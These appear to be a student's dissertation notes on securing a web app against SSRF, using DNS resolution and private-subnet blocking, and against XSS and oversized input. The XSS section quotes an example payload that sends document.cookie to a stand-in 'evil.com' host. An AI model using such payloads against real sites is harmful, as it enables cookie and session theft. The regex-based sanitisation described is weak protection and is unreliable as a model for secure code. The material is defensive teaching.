# Cyber Security: SSRF Protection & Input Sanitisation

Hey! So one of the biggest requirements my supervisor stressed was making sure this app is rock solid against cyber attacks. Since users can submit raw URLs and text, we have to prevent them from executing code on our server or using our server to scan private networks. Here is how we locked it down!

---

## 1. SSRF Protection (Server-Side Request Forgery)

**The Threat:** If a user submits a URL like `http://127.0.0.1:27017` or `http://192.168.1.1` (local loopbacks or router addresses), and our backend tries to scrape it, an attacker could access database handles, local server files, or AWS metadata. This is called SSRF.

### How we blocked it:
In `backend/app/utils/security.py`, we wrote a strict verification function called `is_safe_url`:

1.  **Strict URL Parsing:** We parse the URL and extract the domain. If it's not a valid HTTP/HTTPS scheme, we drop it immediately.
2.  **DNS Resolution:** We resolve the domain name to its actual IPv4 address using `socket.getaddrinfo`. This is crucial because an attacker could use a domain redirecting to `127.0.0.1`.
3.  **Subnet Filtering:** We convert the resolved IP to an `ipaddress` object and check it against all reserved/private subnets:
    *   `127.0.0.0/8` (Loopback)
    *   `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` (Private RFC 1918 networks)
    *   `169.254.169.254` (Cloud instance metadata endpoints)
    *   `0.0.0.0`, etc.
4.  **Fallback Scraper Gate:** The scraper in `source.py` calls this check *before* initiating any HTTP request. If the IP is unsafe, it raises a `400 Bad Request` and stops.

---

## 2. Input Sanitisation & XSS Protection

**The Threat:** Users can write whatever they want in the text submission boxes. An attacker might paste `<script>fetch('http://evil.com?cookie=' + document.cookie)</script>` (Cross-Site Scripting or XSS) or try HTML/SQL injections.

### How we blocked it:
1.  **Regex Scrubbing:** In `security.py`, we pass all user-provided text through `sanitize_text()`. This uses regular expressions to strip out `<script>` tags, inline event handlers (like `onload` or `onerror`), and characters that could mess with HTML outputs.
2.  **FastAPI Input Model Constraints:** Pydantic validation handles length limits (`min_length=1`, `max_length=50000`) so an attacker cannot crash the server with a 1GB text file (denial of service).
3.  **Newspaper Scraping Size Caps:** In `backend/app/routers/analysis.py`, we set a maximum file size limit of 2MB (`MAX_FILE_SIZE`) and a timeout of 5 seconds. This prevents "zip bomb" attacks or endless scraping loops that block our async event loop.

---

*BSc IT Dissertation Notes — Michael Mazhambe*
